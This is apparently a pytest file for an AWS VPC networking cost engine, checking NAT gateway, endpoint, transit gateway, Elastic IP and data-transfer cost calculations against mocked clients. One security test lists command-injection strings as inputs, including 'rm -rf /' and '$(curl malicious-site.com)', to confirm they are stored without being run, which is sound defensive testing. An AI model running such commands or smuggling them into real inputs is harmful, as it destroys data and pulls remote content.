"""
Tests for Networking Cost Engine

Tests the core cost calculation and analysis logic for VPC networking components.
"""

import time
from datetime import datetime, timedelta
from unittest.mock import Mock, patch

import boto3
import pytest

from runbooks.vpc.config import VPCNetworkingConfig
from runbooks.vpc.cost_engine import NetworkingCostEngine


@pytest.mark.unit
class TestNetworkingCostEngine:
    """Test Networking Cost Engine functionality."""

    def test_initialization_default(self):
        """Test cost engine initialization with defaults."""
        engine = NetworkingCostEngine()

        assert engine.session is not None
        assert isinstance(engine.config, VPCNetworkingConfig)
        assert engine.cost_model is not None
        assert engine._cost_explorer_client is None
        assert engine._cloudwatch_client is None

    def test_initialization_with_parameters(self, vpc_test_config):
        """Test cost engine initialization with parameters."""
        mock_session = Mock(spec=boto3.Session)

        engine = NetworkingCostEngine(session=mock_session, config=vpc_test_config)

        assert engine.session == mock_session
        assert engine.config == vpc_test_config
        assert engine.cost_model == vpc_test_config.cost_model

    def test_lazy_client_loading(self, networking_cost_engine):
        """Test lazy loading of AWS clients."""
        # Initially, clients should be None
        assert networking_cost_engine._cost_explorer_client is None
        assert networking_cost_engine._cloudwatch_client is None

        # Mock the session client method
        mock_ce_client = Mock()
        mock_cw_client = Mock()

        networking_cost_engine.session.client.side_effect = lambda service, **kwargs: {
            "ce": mock_ce_client,
            "cloudwatch": mock_cw_client,
        }.get(service)

        # Access properties should create clients
        ce_client = networking_cost_engine.cost_explorer
        cw_client = networking_cost_engine.cloudwatch

        assert ce_client == mock_ce_client
        assert cw_client == mock_cw_client
        assert networking_cost_engine._cost_explorer_client == mock_ce_client
        assert networking_cost_engine._cloudwatch_client == mock_cw_client

    @pytest.mark.performance
    def test_nat_gateway_cost_calculation_performance(
        self, networking_cost_engine, performance_benchmarks, assert_performance_benchmark
    ):
        """Test NAT Gateway cost calculation performance."""
        # Mock CloudWatch response
        mock_cloudwatch = Mock()
        mock_cloudwatch.get_metric_statistics.return_value = {
            "Datapoints": [
                {
                    "Sum": 5368709120.0,  # 5 GB in bytes
                    "Average": 100.0,
                    "Maximum": 150.0,
                }
            ]
        }

        networking_cost_engine._cloudwatch_client = mock_cloudwatch

        start_time = time.time()
        result = networking_cost_engine.calculate_nat_gateway_cost("nat-0123456789abcdef0", days=30)
        execution_time = time.time() - start_time

        # Assert performance benchmark
        assert_performance_benchmark(execution_time, "cost_calculation_max_time", performance_benchmarks)

        # Validate result structure
        assert "nat_gateway_id" in result
        assert "base_cost" in result
        assert "data_processing_cost" in result
        assert "total_cost" in result

    def test_nat_gateway_cost_calculation_basic(self, networking_cost_engine):
        """Test basic NAT Gateway cost calculation without data processing."""
        result = networking_cost_engine.calculate_nat_gateway_cost(
            "nat-0123456789abcdef0", days=30, include_data_processing=False
        )

        # Validate basic cost calculation
        expected_base_cost = 0.045 * 24 * 30  # hourly rate * hours * days

        assert result["nat_gateway_id"] == "nat-0123456789abcdef0"
        assert result["period_days"] == 30
        assert result["base_cost"] == expected_base_cost
        assert result["data_processing_cost"] == 0.0
        assert result["total_cost"] == expected_base_cost
        assert result["daily_average"] == expected_base_cost / 30
        assert result["monthly_projection"] == expected_base_cost

    def test_nat_gateway_cost_calculation_with_data_processing(self, networking_cost_engine):
        """Test NAT Gateway cost calculation with data processing."""
        # Mock CloudWatch response with data processing metrics
        mock_cloudwatch = Mock()
        mock_cloudwatch.get_metric_statistics.return_value = {
            "Datapoints": [
                {
                    "Sum": 10737418240.0,  # 10 GB in bytes
                    "Average": 100.0,
                    "Maximum": 150.0,
                }
            ]
        }

        networking_cost_engine._cloudwatch_client = mock_cloudwatch

        result = networking_cost_engine.calculate_nat_gateway_cost(
            "nat-0123456789abcdef0", days=30, include_data_processing=True
        )

        # Validate cost calculation with data processing
        expected_base_cost = 0.045 * 24 * 30
        expected_data_cost = 10.0 * 0.045  # 10 GB * $0.045/GB
        expected_total = expected_base_cost + expected_data_cost

        assert result["base_cost"] == expected_base_cost
        assert result["data_processing_cost"] == expected_data_cost
        assert result["total_cost"] == expected_total
        assert result["monthly_projection"] == expected_total

    def test_nat_gateway_cost_with_cloudwatch_error(self, networking_cost_engine):
        """Test NAT Gateway cost calculation when CloudWatch fails."""
        # Mock CloudWatch to raise exception
        mock_cloudwatch = Mock()
        mock_cloudwatch.get_metric_statistics.side_effect = Exception("CloudWatch API Error")

        networking_cost_engine._cloudwatch_client = mock_cloudwatch

        result = networking_cost_engine.calculate_nat_gateway_cost(
            "nat-0123456789abcdef0", days=30, include_data_processing=True
        )

        # Should still calculate base cost, but no data processing cost
        expected_base_cost = 0.045 * 24 * 30

        assert result["base_cost"] == expected_base_cost
        assert result["data_processing_cost"] == 0.0
        assert result["total_cost"] == expected_base_cost

    def test_vpc_endpoint_cost_calculation_interface(self, networking_cost_engine):
        """Test VPC Endpoint cost calculation for Interface endpoints."""
        result = networking_cost_engine.calculate_vpc_endpoint_cost(
            endpoint_type="Interface", availability_zones=2, data_processed_gb=100.0
        )

        # Validate Interface endpoint cost calculation
        expected_base_cost = 10.0 * 2  # $10/month * 2 AZs
        expected_data_cost = 100.0 * 0.01  # 100 GB * $0.01/GB
        expected_total = expected_base_cost + expected_data_cost

        assert result["endpoint_type"] == "Interface"
        assert result["availability_zones"] == 2
        assert result["data_processed_gb"] == 100.0
        assert result["base_cost"] == expected_base_cost
        assert result["data_processing_cost"] == expected_data_cost
        assert result["total_monthly_cost"] == expected_total

    def test_vpc_endpoint_cost_calculation_gateway(self, networking_cost_engine):
        """Test VPC Endpoint cost calculation for Gateway endpoints."""
        result = networking_cost_engine.calculate_vpc_endpoint_cost(
            endpoint_type="Gateway", availability_zones=0, data_processed_gb=1000.0
        )

        # Gateway endpoints are always free
        assert result["endpoint_type"] == "Gateway"
        assert result["base_cost"] == 0.0
        assert result["data_processing_cost"] == 0.0
        assert result["total_monthly_cost"] == 0.0

    def test_transit_gateway_cost_calculation(self, networking_cost_engine):
        """Test Transit Gateway cost calculation."""
        result = networking_cost_engine.calculate_transit_gateway_cost(attachments=5, data_processed_gb=500.0, days=30)

        # Validate Transit Gateway cost calculation
        expected_base_cost = 0.05 * 24 * 30  # $0.05/hour * 24h * 30 days
        expected_attachment_cost = 0.05 * 24 * 30 * 5  # $0.05/hour * 24h * 30 days * 5 attachments
        expected_data_cost = 500.0 * 0.02  # 500 GB * $0.02/GB
        expected_total = expected_base_cost + expected_attachment_cost + expected_data_cost
        expected_monthly = expected_total  # Already calculated for 30 days

        assert result["attachments"] == 5
        assert result["data_processed_gb"] == 500.0
        assert result["base_cost"] == expected_base_cost
        assert result["attachment_cost"] == expected_attachment_cost
        assert result["data_processing_cost"] == expected_data_cost
        assert result["total_cost"] == expected_total
        assert result["monthly_projection"] == expected_monthly

    def test_elastic_ip_cost_calculation(self, networking_cost_engine):
        """Test Elastic IP cost calculation."""
        result = networking_cost_engine.calculate_elastic_ip_cost(
            idle_hours=720,  # 30 days
            remaps=5,
        )

        # Validate Elastic IP cost calculation
        expected_idle_cost = 720 * 0.005  # 720 hours * $0.005/hour
        expected_remap_cost = 5 * 0.10  # 5 remaps * $0.10/remap
        expected_total = expected_idle_cost + expected_remap_cost
        expected_monthly = expected_total  # 720 hours = 30 days

        assert result["idle_hours"] == 720
        assert result["remaps"] == 5
        assert result["idle_cost"] == expected_idle_cost
        assert result["remap_cost"] == expected_remap_cost
        assert result["total_cost"] == expected_total
        assert result["monthly_projection"] == expected_monthly

    def test_elastic_ip_cost_with_no_idle_time(self, networking_cost_engine):
        """Test Elastic IP cost calculation with no idle time."""
        result = networking_cost_engine.calculate_elastic_ip_cost(idle_hours=0, remaps=3)

        expected_remap_cost = 3 * 0.10

        assert result["idle_cost"] == 0.0
        assert result["remap_cost"] == expected_remap_cost
        assert result["total_cost"] == expected_remap_cost
        assert result["monthly_projection"] == expected_remap_cost

    def test_data_transfer_cost_calculation(self, networking_cost_engine):
        """Test data transfer cost calculation."""
        result = networking_cost_engine.calculate_data_transfer_cost(
            inter_az_gb=1000.0, inter_region_gb=500.0, internet_out_gb=200.0
        )

        # Validate data transfer cost calculation
        expected_inter_az = 1000.0 * 0.01  # 1000 GB * $0.01/GB
        expected_inter_region = 500.0 * 0.02  # 500 GB * $0.02/GB
        expected_internet_out = 200.0 * 0.09  # 200 GB * $0.09/GB
        expected_total = expected_inter_az + expected_inter_region + expected_internet_out

        assert result["inter_az_gb"] == 1000.0
        assert result["inter_region_gb"] == 500.0
        assert result["internet_out_gb"] == 200.0
        assert result["inter_az_cost"] == expected_inter_az
        assert result["inter_region_cost"] == expected_inter_region
        assert result["internet_out_cost"] == expected_internet_out
        assert result["total_cost"] == expected_total

    def test_get_actual_costs_from_cost_explorer(self, networking_cost_engine, mock_cost_explorer_responses):
        """Test getting actual costs from Cost Explorer."""
        # Mock Cost Explorer response
        mock_ce = Mock()
        mock_ce.get_cost_and_usage.return_value = mock_cost_explorer_responses["vpc_costs"]

        networking_cost_engine._cost_explorer_client = mock_ce

        result = networking_cost_engine.get_actual_costs_from_cost_explorer(
            service="Amazon Virtual Private Cloud",
            start_date="2024-01-01",
            end_date="2024-01-31",
            granularity="MONTHLY",
        )

        # Validate Cost Explorer result
        assert result["service"] == "Amazon Virtual Private Cloud"
        assert result["granularity"] == "MONTHLY"
        assert result["total_cost"] == 145.67
        assert len(result["results_by_time"]) == 1

        # Validate API call
        mock_ce.get_cost_and_usage.assert_called_once()
        call_args = mock_ce.get_cost_and_usage.call_args[1]
        assert call_args["TimePeriod"]["Start"] == "2024-01-01"
        assert call_args["TimePeriod"]["End"] == "2024-01-31"
        assert call_args["Granularity"] == "MONTHLY"

    def test_cost_explorer_error_handling(self, networking_cost_engine):
        """Test Cost Explorer error handling."""
        # Mock Cost Explorer to raise exception
        mock_ce = Mock()
        mock_ce.get_cost_and_usage.side_effect = Exception("Cost Explorer API Error")

        networking_cost_engine._cost_explorer_client = mock_ce

        result = networking_cost_engine.get_actual_costs_from_cost_explorer(
            service="Amazon Virtual Private Cloud", start_date="2024-01-01", end_date="2024-01-31"
        )

        # Should return error result
        assert result["service"] == "Amazon Virtual Private Cloud"
        assert "error" in result
        assert result["total_cost"] == 0.0

    def test_estimate_optimization_savings(self, networking_cost_engine):
        """Test optimization savings estimation."""
        current_costs = {"nat_gateways": 200.0, "vpc_endpoints": 50.0, "elastic_ips": 10.0}

        optimization_scenarios = [
            {
                "name": "Conservative",
                "description": "Remove idle resources",
                "reductions": {
                    "nat_gateways": 20,  # 20% reduction
                    "elastic_ips": 50,  # 50% reduction
                },
                "risk_level": "low",
                "effort": "low",
            },
            {
                "name": "Aggressive",
                "description": "Comprehensive optimization",
                "reductions": {
                    "nat_gateways": 40,  # 40% reduction
                    "vpc_endpoints": 25,  # 25% reduction
                    "elastic_ips": 80,  # 80% reduction
                },
                "risk_level": "high",
                "effort": "high",
            },
        ]

        result = networking_cost_engine.estimate_optimization_savings(current_costs, optimization_scenarios)

        # Validate savings estimation
        assert result["current_monthly_cost"] == 260.0  # Sum of current costs
        assert len(result["scenarios"]) == 2

        # Validate conservative scenario
        conservative = next(s for s in result["scenarios"] if s["name"] == "Conservative")
        expected_conservative_savings = (200.0 * 0.20) + (10.0 * 0.50)  # 40 + 5 = 45
        assert conservative["monthly_savings"] == expected_conservative_savings
        assert conservative["annual_savings"] == expected_conservative_savings * 12

        # Validate aggressive scenario
        aggressive = next(s for s in result["scenarios"] if s["name"] == "Aggressive")
        expected_aggressive_savings = (200.0 * 0.40) + (50.0 * 0.25) + (10.0 * 0.80)  # 80 + 12.5 + 8 = 100.5
        assert aggressive["monthly_savings"] == expected_aggressive_savings

        # Validate recommended scenario (should be the one with maximum savings)
        assert result["recommended_scenario"]["name"] == "Aggressive"
        assert result["maximum_savings"] == expected_aggressive_savings

    def test_estimate_optimization_with_no_scenarios(self, networking_cost_engine):
        """Test optimization estimation with no scenarios."""
        current_costs = {"nat_gateways": 100.0}
        optimization_scenarios = []

        result = networking_cost_engine.estimate_optimization_savings(current_costs, optimization_scenarios)

        assert result["current_monthly_cost"] == 100.0
        assert len(result["scenarios"]) == 0
        assert result["recommended_scenario"] is None
        assert result["maximum_savings"] == 0.0

    def test_estimate_optimization_with_empty_costs(self, networking_cost_engine):
        """Test optimization estimation with empty current costs."""
        current_costs = {}
        optimization_scenarios = [{"name": "Test", "reductions": {"nonexistent": 50}}]

        result = networking_cost_engine.estimate_optimization_savings(current_costs, optimization_scenarios)

        assert result["current_monthly_cost"] == 0.0
        assert len(result["scenarios"]) == 1
        assert result["scenarios"][0]["monthly_savings"] == 0.0

    @pytest.mark.integration
    def test_cost_calculation_consistency(self, networking_cost_engine):
        """Test consistency across different cost calculation methods."""
        # Calculate costs using different methods and ensure consistency

        # NAT Gateway costs for different periods
        nat_cost_30_days = networking_cost_engine.calculate_nat_gateway_cost(
            "nat-test", days=30, include_data_processing=False
        )

        nat_cost_60_days = networking_cost_engine.calculate_nat_gateway_cost(
            "nat-test", days=60, include_data_processing=False
        )

        # Daily average should be consistent
        daily_30 = nat_cost_30_days["daily_average"]
        daily_60 = nat_cost_60_days["daily_average"]

        assert abs(daily_30 - daily_60) < 0.01, "Daily averages should be consistent across periods"

        # Total cost should scale linearly
        expected_60_day_cost = nat_cost_30_days["base_cost"] * 2
        assert abs(nat_cost_60_days["base_cost"] - expected_60_day_cost) < 0.01

    @pytest.mark.performance
    def test_cost_engine_memory_efficiency(self, networking_cost_engine):
        """Test cost engine memory efficiency with large datasets."""
        import sys

        initial_size = sys.getsizeof(networking_cost_engine.__dict__)

        # Perform multiple calculations
        for i in range(100):
            networking_cost_engine.calculate_nat_gateway_cost(f"nat-{i}", days=30, include_data_processing=False)

        final_size = sys.getsizeof(networking_cost_engine.__dict__)

        # Memory usage should not grow significantly
        growth = final_size - initial_size
        assert growth < 10000, f"Memory usage grew too much: {growth} bytes"

    @pytest.mark.security
    def test_cost_calculation_input_validation(self, networking_cost_engine):
        """Test cost calculation input validation and sanitization."""
        # Test with potentially malicious inputs
        malicious_inputs = [
            "nat-0123456789abcdef0; rm -rf /",
            "nat-0123456789abcdef0 && malicious_command",
            "nat-$(curl malicious-site.com)",
        ]

        for malicious_input in malicious_inputs:
            # Should not raise exception and should handle input safely
            result = networking_cost_engine.calculate_nat_gateway_cost(
                malicious_input, days=30, include_data_processing=False
            )

            # Verify malicious input is stored as-is but doesn't cause execution
            assert result["nat_gateway_id"] == malicious_input
            assert isinstance(result["total_cost"], (int, float))

    @pytest.mark.integration
    def test_full_cost_analysis_workflow(self, networking_cost_engine):
        """Test complete cost analysis workflow."""
        # Mock all required services
        mock_cloudwatch = Mock()
        mock_cost_explorer = Mock()

        # Configure CloudWatch mock
        mock_cloudwatch.get_metric_statistics.return_value = {
            "Datapoints": [{"Sum": 5368709120.0, "Average": 100.0, "Maximum": 150.0}]
        }

        # Configure Cost Explorer mock
        mock_cost_explorer.get_cost_and_usage.return_value = {
            "ResultsByTime": [
                {
                    "TimePeriod": {"Start": "2024-01-01", "End": "2024-01-31"},
                    "Total": {"BlendedCost": {"Amount": "123.45", "Unit": "USD"}},
                }
            ]
        }

        networking_cost_engine._cloudwatch_client = mock_cloudwatch
        networking_cost_engine._cost_explorer_client = mock_cost_explorer

        # Execute full workflow
        nat_costs = networking_cost_engine.calculate_nat_gateway_cost("nat-test", days=30)
        vpc_costs = networking_cost_engine.calculate_vpc_endpoint_cost("Interface", 2, 100.0)
        actual_costs = networking_cost_engine.get_actual_costs_from_cost_explorer("VPC", "2024-01-01", "2024-01-31")

        # Validate workflow results
        assert nat_costs["total_cost"] > 0
        assert vpc_costs["total_monthly_cost"] > 0
        assert actual_costs["total_cost"] == 123.45

        # Validate cost relationships
        total_calculated = nat_costs["total_cost"] + vpc_costs["total_monthly_cost"]
        assert total_calculated > 0
